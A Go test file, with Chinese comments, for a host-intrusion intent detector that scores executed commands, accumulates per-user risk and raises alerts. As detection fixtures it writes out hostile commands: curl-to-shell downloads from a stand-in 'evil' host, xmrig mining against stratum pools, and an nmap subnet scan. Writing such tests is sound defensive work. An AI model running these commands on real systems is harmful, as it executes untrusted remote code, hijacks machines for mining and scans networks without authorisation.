// SPDX-License-Identifier: Apache-2.0

package intent

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	pb "github.com/xycxmz/xiezhi-public/proto"
	"github.com/xycxmz/xiezhi-public/server/internal/pipeline"
)

type fakeSink struct {
	mu     sync.Mutex
	alerts []*pipeline.Alert
}

func (s *fakeSink) EmitAlert(_ context.Context, a *pipeline.Alert) {
	s.mu.Lock()
	s.alerts = append(s.alerts, a)
	s.mu.Unlock()
}

func (s *fakeSink) Close() {}

func (s *fakeSink) snapshot() []*pipeline.Alert {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]*pipeline.Alert(nil), s.alerts...)
}

type fakeLabeler struct {
	gate   chan struct{}
	labels []Label
	calls  atomic.Int64
}

func (f *fakeLabeler) Label(_ context.Context, _ string) []Label {
	f.calls.Add(1)
	if f.gate != nil {
		<-f.gate
	}
	return f.labels
}

func waitUntil(t *testing.T, timeout time.Duration, cond func() bool, msg string) {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatalf("等待超时: %s", msg)
}

func writePolicy(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func evExec(uid uint32, tsMs int64, argv ...string) *pb.Event {
	return &pb.Event{
		Header: &pb.EventHeader{AgentId: "agent-1", Hostname: "host-1", TsMs: uint64(tsMs), EventType: pb.EventType_EXECVE},
		Body:   &pb.Event_Execve{Execve: &pb.ExecveEvent{Proc: &pb.ProcessContext{Argv: argv, Uid: uid}}},
	}
}

const attackPolicy = `tags:
  mining_indicator: 5.0
  download_and_execute: 5.0
  package_install: 2.0
threshold: 8.0
maintenance_discount: 0.4
maintenance_tags: [package_install]
`

var baseTs = int64(1731400000000)

func TestEndToEnd(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	writePolicy(t, path, attackPolicy)
	s := &fakeSink{}
	h, err := New(NewBuiltin(), s, path, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer h.Close()

	h.Handle(context.Background(), evExec(0, baseTs, "xmrig", "--url=stratum+tcp://pool:3333"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().EventsProcessed == 1 }, "首事件处理")
	if as := s.snapshot(); len(as) != 0 {
		t.Fatalf("5 分不应告警: %+v", as)
	}

	h.Handle(context.Background(), evExec(0, baseTs+1000, "curl", "-s", "http://evil/x", "|", "sh"))
	waitUntil(t, 3*time.Second, func() bool { return len(s.snapshot()) == 1 }, "桶累计过阈告警")

	a := s.snapshot()[0]
	if a.RuleID != "intent/download_and_execute" || a.Severity != "high" {
		t.Fatalf("RuleID/Severity 错误: %+v", a)
	}
	if a.TsMs != baseTs+1000 || a.AgentID != "agent-1" || a.Hostname != "host-1" {
		t.Fatalf("事件头未透传: %+v", a)
	}
	if !strings.Contains(a.Summary, "桶累计=10.0") || !strings.Contains(a.Summary, "mining_indicator") {
		t.Fatalf("Summary 应含标签与桶累计: %q", a.Summary)
	}
	if !strings.Contains(a.EventRef, `"agentId":"agent-1"`) {
		t.Fatalf("EventRef 应为事件 protojson: %q", a.EventRef)
	}

	// 同桶再累计：已跨越，不再告警；不同 uid 是独立桶。
	h.Handle(context.Background(), evExec(0, baseTs+2000, "nmap", "-sS", "10.0.0.0/8"))
	h.Handle(context.Background(), evExec(1000, baseTs+2000, "xmrig", "--donate-level", "1"))
	h.Handle(context.Background(), &pb.Event{
		Header: &pb.EventHeader{AgentId: "a", Hostname: "h", TsMs: uint64(baseTs), EventType: pb.EventType_CONNECT},
		Body:   &pb.Event_Net{Net: &pb.NetEvent{Op: "connect", Port: 443}},
	})
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().EventsProcessed == 4 }, "全部事件处理完成")
	if as := s.snapshot(); len(as) != 1 {
		t.Fatalf("同桶跨越后不应重复告警，非 EXECVE 应忽略: %d 条", len(as))
	}
}

func TestSeverityBands(t *testing.T) {
	dir := t.TempDir()
	lowPol := filepath.Join(dir, "low.yaml")
	writePolicy(t, lowPol, "tags:\n  interpreter_one_liner: 1.5\nthreshold: 1.0\n")
	sLow := &fakeSink{}
	hLow, err := New(NewBuiltin(), sLow, lowPol, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer hLow.Close()
	hLow.Handle(context.Background(), evExec(0, baseTs, "python3", "-c", "print(1)"))
	waitUntil(t, 3*time.Second, func() bool { return len(sLow.snapshot()) == 1 }, "low 档告警")
	if got := sLow.snapshot()[0].Severity; got != "low" {
		t.Fatalf("1.5 分应为 low: %q", got)
	}

	medPol := filepath.Join(dir, "med.yaml")
	writePolicy(t, medPol, "tags:\n  proxy_anonymizer: 6.0\nthreshold: 5.0\n")
	sMed := &fakeSink{}
	hMed, err := New(NewBuiltin(), sMed, medPol, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer hMed.Close()
	hMed.Handle(context.Background(), evExec(0, baseTs, "proxychains4", "curl", "http://x"))
	waitUntil(t, 3*time.Second, func() bool { return len(sMed.snapshot()) == 1 }, "medium 档告警")
	if got := sMed.snapshot()[0].Severity; got != "medium" {
		t.Fatalf("6 分应为 medium: %q", got)
	}
}

func TestPolicyMissingBypass(t *testing.T) {
	dir := t.TempDir()
	s := &fakeSink{}
	h, err := New(NewBuiltin(), s, filepath.Join(dir, "absent.yaml"), WithPollInterval(time.Hour))
	if err != nil {
		t.Fatalf("策略缺失不应报错: %v", err)
	}
	defer h.Close()
	if st := h.Stats(); st.PolicyActive {
		t.Fatal("无策略文件不应激活")
	}

	h.Handle(context.Background(), evExec(0, baseTs, "curl", "http://x", "|", "sh"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().PolicyBypassed == 1 }, "旁路计数")
	if as := s.snapshot(); len(as) != 0 {
		t.Fatalf("旁路模式不告警: %+v", as)
	}
}

func TestHotReload(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	writePolicy(t, path, attackPolicy)
	s := &fakeSink{}
	h, err := New(NewBuiltin(), s, path, WithPollInterval(20*time.Millisecond))
	if err != nil {
		t.Fatal(err)
	}
	defer h.Close()

	h.Handle(context.Background(), evExec(0, baseTs, "xmrig", "--url=stratum+tcp://p:1"))
	h.Handle(context.Background(), evExec(0, baseTs+1, "curl", "http://x", "|", "sh"))
	waitUntil(t, 3*time.Second, func() bool { return len(s.snapshot()) == 1 }, "初版策略告警")

	// 阈值升到 20：新 uid 桶同量行为不再过阈。
	writePolicy(t, path, "tags:\n  mining_indicator: 5.0\nthreshold: 20.0\n")
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().Reloads == 1 && h.Stats().Threshold == 20.0 }, "阈值热更生效")
	h.Handle(context.Background(), evExec(7, baseTs, "xmrig", "--url=stratum+tcp://p:1"))
	h.Handle(context.Background(), evExec(7, baseTs+1, "xmrig", "--url=stratum+tcp://p:2"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().EventsProcessed == 4 }, "新桶事件处理完")
	if as := s.snapshot(); len(as) != 1 {
		t.Fatalf("阈值 20 下 10 分不应告警: %d 条", len(as))
	}

	// 坏内容：沿用旧策略。
	writePolicy(t, path, "tags:\n  a: not-a-float\nthreshold: 1\n")
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().Rejected == 1 }, "坏策略被拒")
	if st := h.Stats(); !st.PolicyActive || st.Threshold != 20.0 {
		t.Fatalf("坏热更应沿用旧策略: %+v", st)
	}

	// 文件消失：本层旁路。
	os.Remove(path)
	waitUntil(t, 3*time.Second, func() bool { return !h.Stats().PolicyActive }, "文件消失进入旁路")
	h.Handle(context.Background(), evExec(8, baseTs, "xmrig", "--url=stratum+tcp://p:1"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().PolicyBypassed == 1 }, "旁路计数增长")
	if as := s.snapshot(); len(as) != 1 {
		t.Fatal("旁路模式不告警")
	}

	// 文件恢复：自动恢复检测。
	writePolicy(t, path, "tags:\n  mining_indicator: 5.0\nthreshold: 5.0\n")
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().PolicyActive && h.Stats().Reloads >= 2 }, "文件恢复热更")
	h.Handle(context.Background(), evExec(9, baseTs, "xmrig", "--url=stratum+tcp://p:1"))
	waitUntil(t, 3*time.Second, func() bool { return len(s.snapshot()) == 2 }, "恢复后重新告警")
}

func TestLabelerEmptyNoAlert(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	writePolicy(t, path, attackPolicy)
	s := &fakeSink{}
	h, err := New(&fakeLabeler{labels: nil}, s, path, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer h.Close()

	h.Handle(context.Background(), evExec(0, baseTs, "whatever"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().LabelerEmpty == 1 }, "空标签计数")
	if as := s.snapshot(); len(as) != 0 {
		t.Fatalf("空标签不产告警: %+v", as)
	}
}

func TestMaintenanceDiscountEndToEnd(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	// 分值构造保证：worker 并发下任意到达顺序，uid 0 的任何前缀要么未过阈
	// 要么维护占比已过半（4x装包12 + 1x下载4 = 16，占比 0.75 → 6.4 < 8）。
	writePolicy(t, path, `tags:
  package_install: 3.0
  download_and_execute: 4.0
threshold: 8.0
maintenance_discount: 0.4
maintenance_tags: [package_install]
`)
	s := &fakeSink{}
	h, err := New(NewBuiltin(), s, path, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer h.Close()

	for i := 0; i < 4; i++ {
		h.Handle(context.Background(), evExec(0, baseTs+int64(i), "apt-get", "install", "-y", "htop"))
	}
	h.Handle(context.Background(), evExec(0, baseTs+4, "curl", "http://x", "|", "sh"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().EventsProcessed == 5 }, "事件处理完")
	if as := s.snapshot(); len(as) != 0 {
		t.Fatalf("维护占比过半应衰减不告警: %+v", as)
	}

	// uid 1：1 次装包(3) + 2 次下载(8) = 11，占比 3/11 不过半，全额过阈告警。
	h.Handle(context.Background(), evExec(1, baseTs, "apt-get", "install", "-y", "htop"))
	h.Handle(context.Background(), evExec(1, baseTs+1, "curl", "http://x", "|", "sh"))
	h.Handle(context.Background(), evExec(1, baseTs+2, "curl", "http://y", "|", "sh"))
	waitUntil(t, 3*time.Second, func() bool { return len(s.snapshot()) == 1 }, "低维护占比正常告警")
	if a := s.snapshot()[0]; a.RuleID != "intent/download_and_execute" || a.Severity != "high" {
		t.Fatalf("无衰减桶告警元数据错误: %+v", a)
	}
}

func TestCmdlineTruncationHidesTail(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	writePolicy(t, path, "tags:\n  mining_indicator: 5.0\nthreshold: 5.0\n")
	s := &fakeSink{}
	h, err := New(NewBuiltin(), s, path, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer h.Close()

	// 填充用 '.'（不在任何标签模式字符类内）：长 A 串会被 obfuscated_payload
	// 的 base64 长块模式命中，干扰本测试目的。
	pad := strings.Repeat(".", 2000)
	h.Handle(context.Background(), evExec(0, baseTs, pad, "xmrig"))
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().LabelerEmpty == 1 }, "截断后无标签可标")

	h.Handle(context.Background(), evExec(0, baseTs+1, "xmrig", pad))
	waitUntil(t, 3*time.Second, func() bool { return len(s.snapshot()) == 1 }, "关键词在 1KB 内正常命中")
	if as := s.snapshot(); len(as) != 1 {
		t.Fatalf("应恰一条告警: %d", len(as))
	}
}

func TestHandleNonBlocking(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	writePolicy(t, path, attackPolicy)
	gate := make(chan struct{})
	fl := &fakeLabeler{gate: gate, labels: []Label{{Tag: "mining_indicator", Score: 1.0}}}
	s := &fakeSink{}
	h, err := New(fl, s, path, WithQueueCap(4), WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	defer h.Close()

	h.Handle(context.Background(), evExec(0, baseTs, "a"))
	h.Handle(context.Background(), evExec(0, baseTs+1, "b"))
	waitUntil(t, 3*time.Second, func() bool { return fl.calls.Load() == 2 }, "worker 均阻塞在慢标注器")

	start := time.Now()
	for i := 0; i < 200; i++ {
		h.Handle(context.Background(), evExec(0, baseTs+int64(i), "x"))
	}
	if elapsed := time.Since(start); elapsed > 500*time.Millisecond {
		t.Fatalf("Handle 被慢标注器拖住: 200 次耗时 %v", elapsed)
	}
	if st := h.Stats(); st.EventsDropped == 0 {
		t.Fatalf("队列(容量4)满应丢弃计数: %+v", st)
	}

	close(gate)
	waitUntil(t, 3*time.Second, func() bool { return h.Stats().EventsProcessed >= 6 }, "排空积压")
}

func TestHandleAfterClose(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	writePolicy(t, path, attackPolicy)
	h, err := New(NewBuiltin(), &fakeSink{}, path, WithPollInterval(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	h.Close()
	before := h.Stats().EventsIn
	for i := 0; i < 50; i++ {
		h.Handle(context.Background(), evExec(0, baseTs, "xmrig")) // 不得 panic
	}
	if got := h.Stats().EventsIn; got != before {
		t.Fatalf("Close 后 Handle 应直接丢弃: EventsIn %d -> %d", before, got)
	}
	if h.Stats().Panics != 0 {
		t.Fatalf("Close 后 Handle 不应触发 panic 恢复: %+v", h.Stats())
	}
}

func TestHTTPLabeler(t *testing.T) {
	var gotBody labelRequest
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/label" {
			http.NotFound(w, r)
			return
		}
		if err := json.NewDecoder(r.Body).Decode(&gotBody); err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		if gotBody.Cmdline == "fail" {
			http.Error(w, "boom", 500)
			return
		}
		if gotBody.Cmdline == "slow" {
			time.Sleep(300 * time.Millisecond)
		}
		_, _ = w.Write([]byte(`{"labels":[{"tag":"recon_port_scan","score":0.9}]}`))
	}))
	defer srv.Close()

	l := NewHTTPLabeler(srv.URL, 100*time.Millisecond)
	ctx := context.Background()

	got := l.Label(ctx, "nmap -sS")
	if len(got) != 1 || got[0].Tag != "recon_port_scan" || got[0].Score != 0.9 {
		t.Fatalf("正例解析错误: %+v", got)
	}
	if gotBody.Cmdline != "nmap -sS" {
		t.Fatalf("请求体应透传 cmdline: %+v", gotBody)
	}
	if fails := l.Fails(); fails != 0 {
		t.Fatalf("正例不应计失败: %d", fails)
	}

	if got := l.Label(ctx, "fail"); got != nil {
		t.Fatalf("非 2xx 应返回空标签: %+v", got)
	}
	if got := l.Label(ctx, "slow"); got != nil {
		t.Fatalf("超时应返回空标签: %+v", got)
	}
	if fails := l.Fails(); fails != 2 {
		t.Fatalf("失败计数应为 2: %d", fails)
	}
}

func TestLabelerFromEnv(t *testing.T) {
	mustLabeler := func() Labeler {
		t.Helper()
		l, err := NewLabelerFromEnv()
		if err != nil {
			t.Fatal(err)
		}
		return l
	}
	t.Setenv("XIEZHI_LABELER", "")
	if _, ok := mustLabeler().(*Builtin); !ok {
		t.Fatal("默认应为 builtin")
	}
	t.Setenv("XIEZHI_LABELER", "BUILTIN")
	if _, ok := mustLabeler().(*Builtin); !ok {
		t.Fatal("大小写不敏感")
	}
	t.Setenv("XIEZHI_LABELER", "http")
	if _, err := NewLabelerFromEnv(); err == nil {
		t.Fatal("http 无 URL 应报错")
	}
	t.Setenv("XIEZHI_LABELER_URL", "http://127.0.0.1:9000")
	if _, ok := mustLabeler().(*HTTPLabeler); !ok {
		t.Fatal("http+URL 应构造 HTTPLabeler")
	}
	t.Setenv("XIEZHI_LABELER", "bogus")
	if _, err := NewLabelerFromEnv(); err == nil {
		t.Fatal("未知模式应报错")
	}
}

func TestNewValidation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "p.yaml")
	writePolicy(t, path, attackPolicy)
	if _, err := New(nil, &fakeSink{}, path); err == nil {
		t.Fatal("labeler 为空应报错")
	}
	if _, err := New(NewBuiltin(), nil, path); err == nil {
		t.Fatal("sink 为空应报错")
	}
	writePolicy(t, path, "tags:\n  a: xx\nthreshold: 1\n")
	if _, err := New(NewBuiltin(), &fakeSink{}, path); err == nil {
		t.Fatal("启动期坏策略应 fail fast")
	}
}
